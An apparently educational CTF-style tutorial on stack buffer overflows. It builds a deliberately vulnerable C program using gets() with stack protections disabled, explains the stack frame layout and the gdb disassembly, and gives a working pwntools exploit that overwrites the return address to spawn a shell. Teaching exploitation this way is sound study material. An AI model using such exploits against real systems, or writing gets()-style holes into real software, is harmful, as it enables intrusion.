# Buffer overflow

Consider the code below:

```c
#include <stdio.h>
void shell(){
    system("/bin/sh");
}
int main(){
    char name[16];
    fputs("Enter name: ", stdout);
    gets(name);
    fputs("Hello: ", stdout);
    puts(name);
    return 0;
}
```

Compile: `gcc bof.c -o bof -no-pie -fno-stack-protector`

Let's test it out. As expected, the input is echoed back.

```
➜ ./bof     
Enter name: hshshhshs
Hello: hshshhshs
```

We will get a segmentation fault if the input is more than 16 characters long.

```
➜ ./bof
Enter name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Hello: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    1654 segmentation fault  ./bof
```

## The stack

The stack grows from high memory addresses to low memory addresses. 

The top of the stack is represented by `rbp` **(frame base pointer)**. `ebp` functions the same way as `rbp`, except it is 4 bytes instead of 8 bytes as addresses are 4 bytes on 32 bit (x86) systems. Because the stack grows from high addresses to low addresses, addresses on the stack are often represented by `rbp - x`, where x is a hex number. For example: `lea rdi,[rbp-0x10]` sets `rdi` to the address at index 16 on the stack.

The stack contains many frames, one for each function call. For this exploit we can confine ourselves to a single frame. 

`rsp` is the **stack pointer** which points to the top of the stack frame (ie the lowest allocated memory address). `rbp`>`rsp` as the stack grows downwards.

At the bottom (highest memory address) of the frame is the **return address pointer** or `rip`. This points to the next instruction to be called after the function returns ([ret](https://www.felixcloutier.com/x86/ret)). Next is `rbp`, which points to itself (this may be 4 or 8 bytes depending on x64/x86). 

Local variables are then pushed on the stack (decrementing `rsp`), in the order they are declared. 

<img src="https://www.coengoedegebure.com/content/images/2018/08/stackbuffer.png" alt="stackbuffer" style="zoom: 50%;" />

However, buffers are filled in the opposite direction (towards `rbp`) on the stack.

<img src="https://www.coengoedegebure.com/content/images/2018/08/memoryoverflow-1.png" alt="memoryoverflow-1" style="zoom:50%;" />

This allows us to overwrite `rip`, thus allowing us to control the flow of the program.

## Registers

[X86 64 Register and Instruction Quick Start - CDOT Wiki (senecacollege.ca)](https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start)

`rbp`: Register base pointer (stack base pointer)

`rsp`: Register stack pointer (stack top pointer)

`rip`: Return instruction pointer

`rdi`: Register destination index (first argument in function call)

`rsi`: Register source index (second argument in function call)

`rdx`: Register d extended (third argument in function call)

`rcx`: Register c extended (4th argument in function call)

`r8d`: 5th argument in function call

`r9d`: 6th argument in function call

## Analysis of our program

Let's run the program in `gdb` and find out what's going on.

```assembly
gdb-peda$ disas main
Dump of assembler code for function main:
   0x000000000000117d <+0>:     push   rbp
   0x000000000000117e <+1>:     mov    rbp,rsp
   0x0000000000001181 <+4>:     sub    rsp,0x10
   0x0000000000001185 <+8>:     mov    rax,QWORD PTR [rip+0x2ebc]        # 0x4048 <stdout@GLIBC_2.2.5>
   0x000000000000118c <+15>:    mov    rcx,rax
   0x000000000000118f <+18>:    mov    edx,0xc
   0x0000000000001194 <+23>:    mov    esi,0x1
   0x0000000000001199 <+28>:    lea    rdi,[rip+0xe6c]        # 0x200c
   0x00000000000011a0 <+35>:    call   0x1060 <fwrite@plt>
   0x00000000000011a5 <+40>:    lea    rax,[rbp-0x10]
   0x00000000000011a9 <+44>:    mov    rdi,rax
   0x00000000000011ac <+47>:    mov    eax,0x0
   0x00000000000011b1 <+52>:    call   0x1050 <gets@plt>
   0x00000000000011b6 <+57>:    mov    rax,QWORD PTR [rip+0x2e8b]        # 0x4048 <stdout@GLIBC_2.2.5>
   0x00000000000011bd <+64>:    mov    rcx,rax
   0x00000000000011c0 <+67>:    mov    edx,0x7
   0x00000000000011c5 <+72>:    mov    esi,0x1
   0x00000000000011ca <+77>:    lea    rdi,[rip+0xe48]        # 0x2019
   0x00000000000011d1 <+84>:    call   0x1060 <fwrite@plt>
   0x00000000000011d6 <+89>:    lea    rax,[rbp-0x10]
   0x00000000000011da <+93>:    mov    rdi,rax
   0x00000000000011dd <+96>:    call   0x1030 <puts@plt>
   0x00000000000011e2 <+101>:   mov    eax,0x0
   0x00000000000011e7 <+106>:   leave  
   0x00000000000011e8 <+107>:   ret    
End of assembler dump.
```

First, `rbp` is pushed onto the stack and `rsp` is moved into `rbp`, setting them to the same value.

Next, 16 bytes are allocated for the buffer:` sub rsp,0x10`

Next, the `gets` function call:

```asm
0x00000000000011a5 <+40>:    lea    rax,[rbp-0x10]
0x00000000000011a9 <+44>:    mov    rdi,rax
0x00000000000011ac <+47>:    mov    eax,0x0
0x00000000000011b1 <+52>:    call   0x1050 <gets@plt>
```

In line 1, the [LEA](https://www.felixcloutier.com/x86/lea) (load effective address) loads the address of `rbp-16` into `rax`. This is the address of the 'end' of the buffer. The buffer will be filled from here up towards `rbp`. In line 2, `rax` is moved into `rdi`, which is the pointer for the first argument of a function. In line 4, `gets` is called. 

Our goal is to call the `shell` function, so let's find out where it is:

```asm
gdb-peda$ disas shell
Dump of assembler code for function shell:                                                                 
   0x0000000000401152 <+0>:     push   rbp   
```

So the function is at `0x0000000000401152`. We can begin to craft our payload using pwntools.

## Pwntools

```python
# Import pwntools
from pwn import *

# Start process
p = process("./bof")
# Load ELF
e = ELF("./bof")

# Get address of shell function from ELF
# p64(x) to turn x into 64 bit little endian
address = p64(e.symbols["shell"])

# 16 bytes to fill buffer, 8 bytes for rbp
offset = 16 + 8

payload = b"a" * offset + address
# Send payload
p.sendline(payload)
# Allow us to get shell afterwards!
p.interactive()
```

Output:

```shell
➜ python3 exp-bof.py                           
[+] Starting local process './bof': pid 2191
[*] '/home/kali/Desktop/ctf-stuff/pwn/bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
Enter name: Hello: aaaaaaaaaaaaaaaaaaaaaaaaR\x11
$ ls
bof  bof.c exp-bof.py
$  
```

